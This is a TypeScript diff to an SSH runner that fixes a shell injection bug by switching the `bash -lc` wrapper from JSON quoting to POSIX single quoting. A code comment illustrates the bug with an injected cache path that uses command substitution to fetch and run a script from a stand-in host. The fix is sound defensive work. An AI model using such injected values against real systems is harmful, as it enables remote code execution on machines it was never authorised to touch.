@@ -9,6 +9,12 @@ import type { SshOverrides } from '../../shared/compute'
 // Maximum bytes captured per stream before we truncate. Caller can pass a smaller cap.
 const DEFAULT_MAX_OUTPUT_BYTES = 64 * 1024
 
+// Wraps a string in POSIX single quotes, escaping embedded single quotes via the '\'' idiom. Inside
+// single quotes the shell expands nothing, so this is the only safe way to hand an arbitrary command
+// string to an outer `bash -lc` layer. (scp-runner exports an identical helper; duplicated here to keep
+// ssh-runner free of a dependency on the scp path.)
+const shellSingleQuote = (value: string): string => `'${value.replace(/'/g, `'\\''`)}'`
+
 // Short connect timeout used for probe calls; SSH itself honors ConnectTimeout from config but we
 // add it explicitly to override any large value from ~/.ssh/config (design.md §1).
 const DEFAULT_CONNECT_TIMEOUT_SECS = 10
@@ -250,7 +256,13 @@ export class SystemSshRunner implements SshRunner {
 
     // When loginShell is requested wrap the command in `bash -lc '...'` so module / conda PATHs
     // are loaded. This matches the call_command semantic (design.md §5).
-    const finalCommand = loginShell ? `bash -lc ${JSON.stringify(remoteCommand)}` : remoteCommand
+    //
+    // The wrapper MUST single-quote, not JSON-quote. A double-quoted layer leaves `$(...)`, backticks
+    // and `$VAR` live for the OUTER shell, which silently undoes any inner single-quoting a caller did:
+    // a spec-supplied cache path like `/data/$(curl evil.sh|sh)` reaches the witness as
+    // `test -d '/data/$(...)'`, and the outer double-quoted layer expands it anyway. Single-quoting the
+    // whole command makes the outer layer literal, so inner quoting (quoteRemotePath) is load-bearing.
+    const finalCommand = loginShell ? `bash -lc ${shellSingleQuote(remoteCommand)}` : remoteCommand
 
     const args = [...target.extraArgs, target.host, finalCommand]
 
